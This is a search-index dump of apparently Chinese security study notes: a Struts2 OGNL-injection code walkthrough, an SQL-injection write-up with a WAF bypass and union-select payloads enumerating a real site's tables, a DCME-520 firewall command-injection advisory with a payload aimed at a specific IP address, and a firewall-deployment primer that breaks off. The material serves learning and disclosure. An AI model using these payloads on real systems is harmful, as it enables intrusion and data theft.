<p>Action\u6267\u884c\u5b8c\u6bd5\u540e\u7684\u6b65\u9aa4\u662f\u64cd\u4f5c\u5bf9\u5e94\u7684\u6a21\u677f\u9875\u9762\uff0c\u5f53LoginAction\u7684execute\u65b9\u6cd5\u8fd4\u56de\u201cerror\u201d\u5b57\u7b26\u4e32\u65f6\uff0cStruts2\u8981\u53bb\u89e3\u6790\u7684\u6a21\u677f\u9875\u9762\u662findex.jsp</p> <p>Struts2 \u652f\u6301\u591a\u79cd\u6a21\u677f\u5f15\u64ce\uff0c\u79cd\u7c7b\u5982\u56fe\u6240\u793a\uff0cjsp \u53ea\u662f\u5176\u4e2d\u4e00\u79cd\u3002\u6240\u4ee5\u5728\u771f\u6b63\u5f00\u59cb\u89e3\u6790\u4e4b\u524d\uff0cStruts2 \u8fd8\u9700\u8981\u5224\u65ad\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u7684\u6a21\u677f\u5f15\u64ce\u79cd\u7c7b\uff0c\u4ece\u800c\u8c03\u7528\u5bf9\u5e94\u7684\u7c7b\u548c\u65b9\u6cd5\u3002</p> <p></p> <p>\u8d1f\u8d23\u5904\u7406 JSP \u7684\u7c7b\u662f <code>org.apache.struts2.views.jsp.ComponentTagSupport</code>\u3002\u89e3\u6790\u4f1a\u4ece\u7b2c\u4e00\u4e2a Struts2 \u6807\u7b7e\u5373<code>&lt;s:form action=\"login\"&gt;</code> \u5f00\u59cb\uff0c\u5f53\u89e3\u6790\u5230 <code>ComponentTagSupport</code>\u7c7b\u65f6\uff0c\u9996\u5148\u88ab\u8c03\u7528\u7684\u65b9\u6cd5\u5c31\u662f <code>doStartTag</code> \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u56fe\u6240\u793a\u3002\u9664<code>doStartTag</code> \u65b9\u6cd5\u5916\uff0c<code>ComponentTagSupport</code> \u4e2d\u8fd8\u6709\u4e00\u4e2a <code>doEndTag</code> \u65b9\u6cd5\uff0c\u4e00\u4e2a\u662f\u89e3\u6790\u6807\u7b7e\u5f00\u59cb\u65f6\u8c03\u7528\uff0c\u53e6\u4e00\u4e2a\u662f\u89e3\u6790\u5230\u6807\u7b7e\u95ed\u5408\u65f6\u8c03\u7528\u3002</p> <p></p> <p>ComponentTagSupport \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\u3002\u7531\u4e8e\u9996\u5148\u88ab\u89e3\u6790\u7684\u662f\u4e00\u4e2a Struts2 Form \u6807\u7b7e\uff0corg.apache.struts2.views \u6709\u4e00\u4e2a\u4e0e From \u6807\u7b7e\u5bf9\u5e94\u7684\u5b9e\u4f53\u7c7b\uff0c\u7c7b\u540d\u4e3a FormTag\uff0c\u662fComponentTagSupport \u7684\u5b50\u7c7b\u3002\u867d\u7136\u5f53\u524d\u65ad\u70b9\u8bbe\u7f6e\u5728 ComponentTagSupport \u7684doStartTag \u65b9\u6cd5\u4e0a\uff0c\u5176\u5b9e\u662f\u5b50\u7c7b\u5728\u8c03\u7528\u7236\u7c7b\u65b9\u6cd5\uff0c\u56e0\u4e3a\u5f53\u524d\u5bf9\u8c61\u662f FromTag \u5bf9\u8c61\uff0c\u5982\u56fe</p> <p></p> <p>\u6211\u4eec\u8df3\u8fc7 From \u6807\u7b7e\u7684\u89e3\u6790\uff0c\u56e0\u4e3a\u5173\u952e\u70b9\u5e76\u4e0d\u5728\u8fd9\u91cc\u3002</p> <p>\u89e3\u6790\u5b8c From \u6807\u7b7e\u540e\u4f1a\u89e3\u6790 textfield \u6807\u7b7e\uff0c\u8fd9\u4e24\u4e2a\u6807\u7b7e\u7684\u7ec6\u8282\u5982\u56fe</p> <p></p> <p>\u9996\u5148\u89e3\u6790\u7b2c\u4e00\u4e2a<code>textfield</code> \u6807\u7b7e\uff0c\u5173\u952e\u7684\u6b65\u9aa4\u5728<code>doEndTag</code> \u65b9\u6cd5\u4e2d\u3002\u9996\u5148\u4f1a\u8c03\u7528<code>this.component.end</code> \u65b9\u6cd5\uff0c\u5982\u56fe</p> <p></p> <p>\u7136\u540e\u6267\u884c\u5230 UIBean \u7c7b\u7684 evaluateParams \u65b9\u6cd5\u3002\u8be5\u65b9\u6cd5\u7528\u6765\u5224\u65ad\u6807\u7b7e\u4e2d\u6709\u54ea\u4e9b\u5c5e\u6027\uff0c\u4f8b\u5982\u5f53\u524d textfield \u6807\u7b7e\u4e2d\u6709\u4e24\u4e2a\u5c5e\u6027\uff1a\u4e00\u4e2a\u662f name \u5c5e\u6027\uff0c\u53e6\u4e00\u4e2a\u662f lable \u5c5e\u6027\uff0c\u5224\u65ad\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7684\u4ee3\u7801\u5982\u56fe</p> <p></p> <p>\u6211\u4eec\u7684\u6807\u7b7e\u91cc\u7f16\u5199\u4e86 name \u5c5e\u6027\uff0c\u7b2c\u4e00\u4e2a if \u5224\u65ad\u7684\u7ed3\u679c\u4e3a true\uff0c\u4f46\u662f\u8be5 name \u5c5e\u6027\u5e76\u4e0d\u662f\u5173\u952e\u70b9\uff0c\u56e0\u6b64\u6211\u4eec\u8df3\u8fc7\u7b2c\u4e00\u4e2a if \u5224\u65ad\uff0c\u76f4\u63a5\u6765\u5230\u7b2c\u4e8c\u4e2a if\uff0c\u5224\u65ad\u6807\u7b7e\u662f\u5426\u6709 label \u5c5e\u6027\uff0c\u8ddf\u8fdb this.findString \u65b9\u6cd5</p> <p>\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u5d4c\u5957\u8c03\u7528\uff0c\u6700\u7ec8\u6267\u884c <code>TextParseUtil</code> \u7c7b\u7684<code>translateVariables</code> \u65b9\u6cd5\u3002\u8fd9\u91cc\u5c31\u662f\u5bfc\u81f4\u6f0f\u6d1e\u4ea7\u751f\u7684\u6838\u5fc3\u95ee\u9898\u6240\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u770b\u4e00\u4e0b\u8be5\u51fd\u6570\u662f\u5982\u4f55\u5904\u7406\u4e00\u4e2a\u6b63\u5e38\u7684\u8bf7\u6c42\u6570\u636e\u7684\u3002\u9996\u5148\u89c2\u5bdf\u5f53\u524d\u7684\u53d8\u91cf\u548c\u503c\uff0c\u5982\u56fe</p> <p></p> <p>\u63a5\u4e0b\u6765\u662f translateVariables \u65b9\u6cd5\u7684\u90e8\u5206\u4ee3\u7801\uff0c\u5982\u56fe</p> <p></p> <pre><code>\u9996\u5148\u4f1a\u8fdb\u5165\u4e00\u4e2a while \u5faa\u73af\uff0c\u8be5\u5faa\u73af\u7684\u4f5c\u7528\u662f\u5224\u65ad label \u5c5e\u6027\u7684\u503c\u662f\u5426\u4ee5\u201c${\u201d\u5f00\u5934\uff0c\u76ee\u7684\u662f\u5224\u65ad\u5176\u662f\u4e0d\u662f\u4e00\u4e2a OGNL \u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u662f\u5219\u8fd4\u56de\u7684\u503c\u4e3a 0\uff0c\u4e0d\u662f\u5219\u8fd4\u56de\u503c\u4e3a\uf02d1\u3002\u7136\u540e\u6839\u636e expression.indexOf \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5224\u65ad\u3002\u7b2c\u4e8c\u4e2a while\u5faa\u73af\u662f\u4e3a\u4e86\u5224\u65ad\u201c{\u201d\u4e0e\u201c}\u201d\u7684\u6570\u91cf\u662f\u5426\u76f8\u7b49\uff0c\u76f8\u7b49\u5219 count \u7684\u503c\u4e3a 0\uff1b\u7531\u4e8e label\u5c5e\u6027\u7684\u503c\u662f\u5b57\u7b26\u4e32\u201cusername\u201d\uff0c\u4e0d\u5305\u62ec\u201c${\u201d\uff0cstart \u503c\u4e3a\uf02d1\uff0ccount \u503c\u4e3a 1\uff0c\u56e0\u6b64\u7b2c\u4e8c\u4e2a while \u5faa\u73af\u65e0\u987b\u6267\u884c\u3002\u6700\u7ec8 if (start == \uf02d1 || end == \uf02d1 || count != 0)\u5224\u65ad\u7ed3\u679c\u662f\u4e3ature\uff0creturn \u7684\u7ed3\u679c\u5982\u56fe\n</code></pre> <p></p> <p>\u8fd4\u56de\u503c\u4ecd\u662f\u5b57\u7b26\u4e32 username\uff0c\u8fd4\u56de\u7ed3\u679c\u5230 UIBean \u7c7b\u7684 evaluateParams \u65b9\u6cd5\u3002\u5f53\u5224\u65ad\u5b8c\u6240\u6709\u5c5e\u6027\u540e\uff0cevaluateParams \u65b9\u6cd5\u4e2d\u6267\u884c\u4e86\u4e00\u4e2a\u64cd\u4f5c\uff0c\u5373\u5c06\u5b57\u7b26\u4e32\u62fc\u63a5\u201c${}\u201d \u6210\u4e3a\u4e00\u4e2a OGNL \u8868\u8fbe\u5f0f\u201c ${username} \u201d\uff0c\u7136\u540e\u518d\u5e26\u5165 TextParseUtil \u7c7b \u7684translateVariables \u65b9\u6cd5\u4e2d\uff0c\u4ee3\u7801\u5982\u56fe 7-108 \u6240\u793a\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u6700\u7ec8\u901a\u8fc7\u53cd\u5c04\u8c03\u7528LoginAction \u5bf9\u8c61\u7684 getUsername \u65b9\u6cd5\uff0c\u4ece\u800c\u83b7\u53d6\u5b58\u50a8\u5728 LoginAction \u5bf9\u8c61\u4e2d username\u5c5e\u6027\u7684\u503c\u3002</p> <p></p> <p>\u6700\u7ec8\u83b7\u53d6\u5230\u7684\u503c\u4e3a admin\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u901a\u8fc7\u524d\u7aef\u4f20\u5165\u7684 username \u7684\u503c\u3002\u4f46\u662f\u63a5\u4e0b\u6765Sturts2\u7684\u64cd\u4f5c\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u83b7\u53d6\u5230admin\u540e\u53c8\u5bf9\u5176\u8fdb\u884c\u4e86\u4e00\u6b21\u5224\u65ad\uff0c\u5224\u65ad\u8be5admin\u662f\u4e0d\u662f OGNL \u8868\u8fbe\u5f0f\u3002\u76f8\u4fe1\u5927\u5bb6\u5df2\u7ecf\u610f\u8bc6\u5230\uff0c\u8fd9\u4e2a admin \u662f\u901a\u8fc7\u524d\u7aef\u4f20\u5165\u7684\uff0c\u662f\u53ef\u63a7\u7684\uff0c\u90a3\u4e48\u53ef\u4e0d\u53ef\u4ee5\u5c06\u53c2\u6570\u7531\u5b57\u7b26\u4e32\u201cadmin\u201d\u66ff\u6362\u6210\u4e00\u4e2a OGNL \u8868\u8fbe\u5f0f\uff1f</p> <p>\u6211\u4eec\u5728 password \u680f\u4e2d\u8fdb\u884c\u4e86\u8fd9\u6837\u7684\u5c1d\u8bd5\uff0c\u7ee7\u7eed\u5206\u6790\uff0c\u524d\u671f\u76f4\u5230\u62fc\u63a5\u5904\u7406%{password}\u4ece LoginAction \u4e2d\u83b7\u53d6 password \u7684\u503c\u4e3a\u6b62\u90fd\u662f\u76f8\u540c\u7684\uff0c\u95ee\u9898\u5c31\u51fa\u5728\u83b7\u53d6\u5230 password \u7684\u503c\u4e4b\u540e\u3002</p> <p>password \u7684\u503c\u4e3a%{2+9}\uff0c\u6309\u7167\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\uff0c\u4f1a\u5148\u5224\u65ad\u5176\u662f\u4e0d\u662f\u4e00\u4e2a\u4ee5\u201c%{\u201d\u5f00\u5934\u7684 OGNL \u8868\u8fbe\u5f0f\u3002%{2+9}\u81ea\u7136\u662f\u7b26\u5408\u7684\uff0cstart \u6700\u540e\u7684\u503c\u4e3a 0\uff0cend \u7684\u503c\u4e3a 5\uff0ccount\u7684\u503c\u4e3a 0\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u5230 stack.findValue \u8fd9\u4e00\u6b65\uff0c\u5c06%{2+9}\u5f53\u4f5c\u8868\u8fbe\u5f0f\u6765\u6267\u884c\uff0c\u540e\u7eed\u7684\u6267\u884c\u4f1a\u6d89\u53ca OGNL\u3002\u6700\u7ec8\u7684\u6267\u884c\u7ed3\u679c\u5982\u56fe</p> <p></p>"},{"location":"SRC/index.html","title":"SRC","text":"<ul> <li>SQL\u6ce8\u5165\u5b9e\u6218 \u7ed5WTS-WAF</li> </ul>"},{"location":"SRC/SRC1/Src1.html","title":"\u5bfb\u627e\u6f0f\u6d1e\u70b9","text":"<p>\u7f51\u7ad9\u524d\u53f0\u9875\u9762\u5982\u4e0b\uff1a</p> <p></p> <p><code>.php?id=6</code>\u53ef\u80fd\u662f\u6ce8\u5165\u70b9</p>"},{"location":"SRC/SRC1/Src1.html#_2","title":"\u8fdb\u884c\u6d4b\u8bd5","text":"<p>\u53d1\u73b0\u5b58\u5728\u62a5\u9519\uff0c\u53ef\u80fd\u5b58\u5728sql\u6ce8\u5165</p> <p></p> <p>\u8f93\u5165<code>/?id=1and 1=1</code>\uff0c\u88abwaf\u62e6\u622a</p> <p></p>"},{"location":"SRC/SRC1/Src1.html#waf","title":"\u7ed5\u8fc7waf","text":"<p>\u53d1\u73b0\u662fWTS-WAF\uff0c\u53ef\u4ee5google\u6216\u8005\u624b\u5de5\u5c1d\u8bd5\u7ed5\u8fc7\u7684\u65b9\u6cd5\u3002\u6211\u8fd9\u91cc\u91c7\u7528\u7684\u662f+\u53f7\u4ee3\u66ff\u7a7a\u683c\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7adf\u7136\u4f7f\u7528+\u53f7\u4ee3\u66ff\u7a7a\u683c\u771f\u80fd\u7ed5\u8fc7\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7ee7\u7eed\u5411\u4e0b\u6d4b\u8bd5\u4e86\u3002</p> <p></p>"},{"location":"SRC/SRC1/Src1.html#_3","title":"\u786e\u5b9a\u5b57\u6bb5\u6570\u76ee","text":"<p>\u901a\u8fc7order by \u786e\u5b9a\u5b57\u6bb5\u6570\u76ee\uff0c\u67e5\u8be2\u7684\u5b57\u6bb5\u6570\u4e3a1</p> <p>\u8f93\u51651\u6ca1\u6709\u62a5\u9519\uff1a</p> <p></p> <p>\u8f93\u51652\u9875\u9762\u62a5\u9519\u4e86\uff1a</p> <p></p>"},{"location":"SRC/SRC1/Src1.html#_4","title":"\u67e5\u8be2\u6570\u636e\u5e93\uff1a","text":"<p>\u4f7f\u7528limit\u547d\u4ee4\u67e5\u770b\u6570\u636e\u5e93\uff0c\u53d1\u73b0\u53ea\u6709\u4e00\u4e2a\u6570\u636e\u5e93\u3002</p> <pre><code>id=-1+union+select+schema_name+from+information_schema.schemata+limit+1,1--+\n</code></pre> <p></p>"},{"location":"SRC/SRC1/Src1.html#_5","title":"\u8bfb\u53d6\u6570\u636e\u5e93\u6570\u636e","text":"<p>\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u8868</p> <pre><code>id=-6+union+select+table_name+from+information_schema.tables+where+table_schema=0x73616e79696e67+limit+0,1--+\n</code></pre> <p></p> <pre><code>id=-6+union+select+table_name+from+information_schema.tables+where+table_schema=0x73616e79696e67+limit+1,1--+\nid=-6+union+select+table_name+from+information_schema.tables+where+table_schema=0x73616e79696e67+limit+2,2--+\n</code></pre> <p>\u6570\u636e\u5e93\u8868:</p> <pre><code>db_down 0x64625f646f776e20\ndb_field 0x64625f6669656c64\ndb_files 0x64625f66696c6573\ndb_index_images 0x64625f696e6465785f696d61676573\ndb_jobs 0x64625f6a6f6273\ndb_manage 0x64625f6d616e616765\ndb_member 0x64625f6d656d626572\ndb_menu 0x64625f6d656e75\ndb_message 0x64625f6d657373616765\ndb_my_ads 0x64625f6d795f616473\ndb_my_links 0x64625f6d795f6c696e6b73\ndb_news 0x64625f6e657773\ndb_products 0x64625f70726f6475637473\ndb_record 0x64625f7265636f7264\ndb_reservation 0x64625f7265736572766174696f6e\ndb_singlepage 0x64625f73696e676c6570616765\ndb_web_class 0x64625f7765625f636c617373\n</code></pre>"},{"location":"SRC/SRC1/Src1.html#_6","title":"\u514d\u8d23\u58f0\u660e","text":"<p>\u672c\u6587\u7ae0\u4ec5\u4f9b\u5b66\u4e60\u548c\u53c2\u8003\u3002\u56e0\u7528\u4e8e\u5176\u4ed6\u7528\u9014\u800c\u4ea7\u751f\u4e0d\u826f\u540e\u679c,\u4f5c\u8005\u4e0d\u627f\u62c5\u4efb\u4f55\u6cd5\u5f8b\u8d23\u4efb\u3002</p>"},{"location":"SRC/SRC2/Src2.html","title":"DCME introduce","text":"<p>DCME-520 multi-core egress gateway adopts multi-core high-performance processor, combined with dedicated ASIC switching chip, which is a new generation of high-performance Internet egress gateway for the business needs of large-capacity users, multi-traffic flow, and multi-service types.DCME-520 has excellent performance and powerful data processing capability, and compared with traditional firewalls, broadband routers, DCME-520 has a super-high wire-speed throughput and industry-leading new connection capability. DCME-520 integrates broadband routing, firewall, switch, VPN, traffic management and monitoring, intranet security, wireless controller, etc. The redundant design of dual power supply increases the reliability of the whole machine, and it can be used with DCN Intelligent Cloud Center to realize cloud management, flexible authentication, network diagnostics, data statistics and other cloud and data applications. Cloud and data applications. Simple and easy to use configuration is especially suitable for large and medium-sized enterprises, campuses, governments, chain organizations, star-rated hotels, carriers and other complex network application environments.</p>"},{"location":"SRC/SRC2/Src2.html#vulnerability-description","title":"Vulnerability description","text":"<p>There is a security vulnerability in DCN Firewall DCME-520, which originates from a user controllable parameter in the file/var/local/ww/function/audit/newstatistics/ip-block.chp that includes remote command execution (RCE).</p> <p>DCME-520 Project address</p> <p>https://www.dcnetworks.com.cn/ruanjian.html</p> <p>After downloading the binary file, we use the binwalk command to separate the file and obtain the source code.</p> <pre><code># binwalk -Me --run-as=root DCME-520-9.1.5.11.bin \n</code></pre> <p>The location of the vulnerability code is in the device system at/usr/local/ww/function/audit/newstatistics/ip-block.chp</p> <p></p>"},{"location":"SRC/SRC2/Src2.html#vulnerability-verification","title":"Vulnerability verification","text":"<p>Log in to the web management backend and access the URL where the vulnerability is located:<code>http://122.225.192.114:8081/function/audit/newstatistics/ip_block.php</code></p> <p></p> <p>Construct payload:<code>http://122.225.192.114:8081/function/audit/newstatistics/ip_block.php?action=save&amp;switch=1&amp;ip=;echo hyhy123 &gt; 1.txt;</code></p> <p>Create a txt file and write its contents.</p> <p></p> <p>Accessing the 1.txt file, it was found that the creation and writing were successful.</p> <p></p>"},{"location":"SRC/SRC2/Src2.html#the-affected-version","title":"The affected version","text":"<ul> <li>DCME-520-9.25.5.11</li> <li>DCME-520-8.25.2.44</li> </ul>"},{"location":"SRC/SRC2/Src2.html#repair-suggestions","title":"Repair suggestions","text":"<p>Modify web backend PHP code to control or filter related parameters</p>"},{"location":"Security_devices/index.html","title":"Security_devices","text":"<ul> <li>\u5b89\u5168\u8bbe\u5907\u4ecb\u7ecd\u4e0e\u4f7f\u7528</li> <li>\u5b89\u5168\u8bbe\u5907\u6f0f\u6d1e\u590d\u73b0</li> </ul>"},{"location":"Security_devices/Introduction/index.html","title":"\u5b89\u5168\u8bbe\u5907\u4ecb\u7ecd\u4e0e\u4f7f\u7528","text":"<ul> <li>\u9632\u706b\u5899\u4ecb\u7ecd#1</li> <li>\u9632\u706b\u5899\u4ecb\u7ecd#2</li> <li>\u5b89\u5168\u8bbe\u5907\u90e8\u7f72\u65b9\u5f0f#1</li> <li>\u5b89\u5168\u8bbe\u5907\u90e8\u7f72\u65b9\u5f0f#2</li> </ul>"},{"location":"Security_devices/Introduction/Deployment1/index.html","title":"Index","text":"<p>\u5b89\u5168\u8bbe\u5907\u7684\u5de5\u4f5c\u6a21\u5f0f\u901a\u5e38\u53ef\u4ee5\u5206\u4e3a\u4e32\u8054\u6a21\u5f0f\u548c\u65c1\u8def\u6a21\u5f0f\u4e24\u5927\u7c7b\u3002</p>"},{"location":"Security_devices/Introduction/Deployment1/index.html#1","title":"1.\u4e32\u8054\u6a21\u5f0f","text":"<p>\u987e\u540d\u601d\u4e49\uff0c\u5728\u8fd9\u79cd\u5de5\u4f5c\u6a21\u5f0f\u4e0b\uff0c\u5b89\u5168\u8bbe\u5907\u662f\u4e32\u8054\u5728\u7f51\u7edc\u94fe\u8def\u4e2d\u7684\uff0c\u6240\u6709\u7684\u7f51\u7edc\u6d41\u91cf\u90fd\u4f1a\u7ecf\u8fc7\u5b89\u5168\u8bbe\u5907\u8fc7\u6ee4\uff0c\u518d\u8f6c\u53d1\u51fa\u53bb\u3002\u4e32\u8054\u6a21\u5f0f\u53c8\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u662f\u8def\u7531\u6a21\u5f0f\uff0c\u4e8c\u662f\u900f\u660e\u6a21\u5f0f\u3002</p>"},{"location":"Security_devices/Introduction/Deployment1/index.html#11","title":"1.1\u8def\u7531\u6a21\u5f0f","text":"<p>\u8def\u7531\u6a21\u5f0f\u4e5f\u53eb\u4f5c\u7f51\u5173\u6a21\u5f0f\uff0c\u662f\u6307\u628a\u5b89\u5168\u8bbe\u5907\u5f53\u505a\u4e00\u4e2a\u8def\u7531\u8bbe\u5907\u6216\u7f51\u5173\u6765\u4f7f\u7528\u3002\u5c40\u57df\u7f51\u4e2d\u7684\u51fa\u5c40\u6d41\u91cf\u5148\u6307\u5411\u5b89\u5168\u8bbe\u5907\u7684\u5185\u7f51\u53e3IP\u5730\u5740\uff0c\u5b89\u5168\u8bbe\u5907\u901a\u8fc7\u9759\u6001\u6216\u52a8\u6001\u8def\u7531\u914d\u7f6e\u6216\u8005NAT\u5730\u5740\u8f6c\u6362\uff0c\u5c06\u6570\u636e\u53d1\u9001\u51fa\u53bb\u3002</p>"},{"location":"Security_devices/Introduction/Deployment1/index.html#12","title":"1.2\u900f\u660e\u6a21\u5f0f","text":"<p>\u900f\u660e\u6a21\u5f0f\u4e5f\u79f0\u7f51\u6865\u6a21\u5f0f\u3001\u6865\u63a5\u6a21\u5f0f\uff0c\u5de5\u4f5c\u5728\u8fd9\u79cd\u6a21\u5f0f\u65f6\uff0c\u539f\u6709\u7684\u7f51\u7edc\u8bbe\u5907\u4e0d\u7528\u66f4\u6539\u4efb\u4f55\u914d\u7f6e\uff0c\u5728\u7f51\u7edc\u94fe\u8def\u4e0a\u5b8c\u5168\u900f\u660e\u3002\u5bf9\u4e8e\u5b89\u5168\u8bbe\u5907\u4e0d\u7528\u914d\u7f6e\u4e0e\u4ea4\u6362\u673a\u3001\u8def\u7531\u5668\u4e92\u8054\u7684IP\u5730\u5740\uff0c\u53ea\u9700\u8981\u914d\u7f6e\u4e00\u5bf9\u5185\u90e8\u6865\u63a5\u7528\u7684IP\u5730\u5740\u5373\u53ef\u3002     \u770b\u62d3\u6251\u56fe\u76f4\u89c2\u4e00\u4e9b\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5de6\u4fa7\u662f\u672a\u63a5\u5165\u5b89\u5168\u8bbe\u5907\u7684\u7f51\u7edc\u914d\u7f6e\u548c\u62d3\u6251\u56fe\uff0c\u4ea4\u6362\u673a\u4e0a\u8054\u7aef\u53e3G1/1\u914d\u7f6eIP\u5730\u5740\u4e3a<code>192.168.1.1/30</code>\uff0c\u8def\u7531\u5668\u4e0b\u8054\u7aef\u53e3G1/1\u914d\u7f6eIP\u5730\u5740\u4e3a<code>192.168.1.2/30</code>\uff0c\u4ea4\u6362\u673a\u4e0e\u8def\u7531\u5668\u4e4b\u95f4\u53ea\u9700\u914d\u7f6e\u8def\u7531\u76f8\u4e92\u6307\u5411\u5373\u53ef\u3002</p> <p>\u4e2d\u95f4\u662f\u8def\u7531\u6a21\u5f0f\u4e0b\uff0c\u63a5\u5165\u5b89\u5168\u8bbe\u5907\u4e4b\u540e\u7684\u7f51\u7edc\u62d3\u6251\u56fe\uff0c\u5bf9\u6bd4\u5de6\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u4ea4\u6362\u673a\u7684\u914d\u7f6e\u6ca1\u6709\u6539\u53d8\uff0c\u5b89\u5168\u8bbe\u5907\u7684\u4e0b\u8054\u63a5\u53e3IP\u914d\u7f6e\u4e3a<code>192.168.1.2/30</code>\uff0c\u8fd9\u662f\u5de6\u56fe\u4e2d\u8def\u7531\u5668\u4e0b\u8054\u63a5\u53e3\u7684IP\u5730\u5740\uff0c\u5b89\u5168\u8bbe\u5907\u7684\u4e0a\u8054\u63a5\u53e3IP\u914d\u7f6e\u4e3a<code>192.168.2.1/30</code>\uff0c\u8def\u7531\u5668\u7684\u4e0b\u8054\u63a5\u53e3\u4e5f\u76f8\u5e94\u6539\u4e3a<code>192.168.2.2/30</code>\u3002\u5728\u914d\u7f6e\u8def\u7531\u65f6\uff0c\u4ea4\u6362\u673a\u7684\u4e0b\u4e00\u8df3\u5730\u5740\u4e5f\u4e0d\u518d\u76f4\u63a5\u6307\u5411\u8def\u7531\u5668\uff0c\u800c\u662f\u6307\u5411\u4e86\u5b89\u5168\u8bbe\u5907\uff0c\u5b89\u5168\u8bbe\u5907\u518d\u901a\u8fc7\u5185\u90e8\u7684\u8def\u7531\u914d\u7f6e\u6307\u5411\u8def\u7531\u5668\uff0c\u4ece\u800c\u5b8c\u6210\u6574\u4e2a\u7f51\u7edc\u6570\u636e\u7684\u8f6c\u53d1\u3002</p> <p>\u53f3\u4fa7\u662f\u900f\u660e\u6a21\u5f0f\u4e0b\uff0c\u63a5\u5165\u5b89\u5168\u8bbe\u5907\u540e\u7684\u62d3\u6251\u56fe\uff0c\u5bf9\u6bd4\u5de6\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u4ea4\u6362\u673a\u548c\u8def\u7531\u5668\u7684\u914d\u7f6e\u672a\u53d1\u751f\u6539\u53d8\uff0c\u5b89\u5168\u8bbe\u5907\u7684\u63a5\u53e3\u53ea\u9700\u914d\u7f6e\u4e00\u5bf9\u5185\u90e8\u6865\u63a5\u5730\u5740<code>1.1.1.1/2</code>\u5373\u53ef\u3002\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u8fd0\u7ef4\u4eba\u5458\u65e0\u9700\u4fee\u6539\u7f51\u7edc\u914d\u7f6e\uff0c\u5373\u53ef\u5b9e\u73b0\u5b89\u5168\u8bbe\u5907\u7684\u63a5\u5165\u3002</p> <p>\u90a3\u4e48\uff0c\u95ee\u9898\u6765\u4e86\uff0c\u5b89\u5168\u8bbe\u5907\u4e32\u8054\u65f6\uff0c\u5982\u4f55\u9009\u62e9\u7528\u8def\u7531\u6a21\u5f0f\u8fd8\u662f\u900f\u660e\u6a21\u5f0f\uff1f\u8fd9\u4e24\u79cd\u6a21\u5f0f\u7684\u4f18\u7f3a\u70b9\uff1f</p> <p>\u5176\u5b9e\uff0c\u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u8def\u7531\u6a21\u5f0f\u90e8\u7f72\u65b9\u5f0f\u6bd4\u8f83\u9ebb\u70e6\uff0c\u9700\u8981\u5bf9\u7f51\u7edc\u8fdb\u884c\u8f83\u5927\u7684\u6539\u52a8\uff0c\u91cd\u65b0\u89c4\u5212\u4e92\u8054IP\u5730\u5740\uff0c\u800c\u4e14\u4e00\u65e6\u8bbe\u5907\u51fa\u73b0\u95ee\u9898\uff0c\u6545\u969c\u6062\u590d\u65f6\u95f4\u4f1a\u5f88\u957f\u3002\u4f46\u662f\uff0c\u8def\u7531\u6a21\u5f0f\u4e0b\uff0c\u5f88\u591a\u529f\u80fd\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u6bd4\u5982NAT\u5730\u5740\u8f6c\u6362\u3001VPN\u901a\u9053\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u3002\u5728\u4e00\u4e9b\u5c0f\u5fae\u4f01\u4e1a\uff0c\u5b8c\u5168\u53ef\u4ee5\u7528\u5b89\u5168\u8bbe\u5907\u505aNAT\u5730\u5740\u8f6c\u6362\uff0c\u4ee3\u66ff\u8def\u7531\u5668\u529f\u80fd\uff0c\u8282\u7701\u5f00\u652f\u3002</p> <p>\u800c\u900f\u660e\u6a21\u5f0f\uff0c\u90e8\u7f72\u7b80\u5355\uff0c\u7f51\u7edc\u914d\u7f6e\u4e0d\u505a\u4efb\u4f55\u66f4\u6539\uff0c\u53ea\u9700\u8981\u5728\u7f51\u7edc\u94fe\u8def\u4e2d\u4e32\u63a5\u8bbe\u5907\u5373\u53ef\u3002\u800c\u4e14\uff0c\u5982\u679c\u5b89\u5168\u8bbe\u5907\u6545\u969c\u65f6\uff0c\u76f4\u63a5\u628a\u8bbe\u5907\u8df3\u8fc7\uff0c\u6216\u662f\u66ff\u6362\u4e00\u53f0\u8bbe\u5907\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u6062\u590d\u65f6\u95f4\u77ed\u3002\u4f46\u662f\u50cfNAT\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u4e09\u5c42\u4ee5\u4e0a\u7684\u529f\u80fd\u4f7f\u7528\u4e0d\u4e86\u3002\u4e0d\u8fc7\uff0c\u5bf9\u4e8e\u5927\u90e8\u5206\u4f01\u4e1a\u6765\u8bf4\uff0cNAT\u3001\u8d1f\u8f7d\u5747\u8861\u3001VPN\u90fd\u6709\u4e13\u7528\u8bbe\u5907\uff0c\u5b89\u5168\u8bbe\u5907\u53ea\u9700\u8981\u505a\u597d\u5b89\u5168\u9632\u62a4\u7684\u529f\u80fd\u5373\u53ef\u3002\u56e0\u6b64\uff0c\u5728\u5b9e\u9645\u90e8\u7f72\u4e2d\uff0c\u900f\u660e\u6a21\u5f0f\u7528\u7684\u6bd4\u8f83\u591a\u3002</p>"},{"location":"Security_devices/Introduction/Deployment1/index.html#2","title":"2.\u65c1\u8def\u6a21\u5f0f","text":"<p>\u5728\u65c1\u8def\u6a21\u5f0f\u4e0b\uff0c\u5b89\u5168\u8bbe\u5907\u5728\u7f51\u7edc\u7ed3\u6784\u4e2d\u5904\u4e8e\u65c1\u8def\u72b6\u6001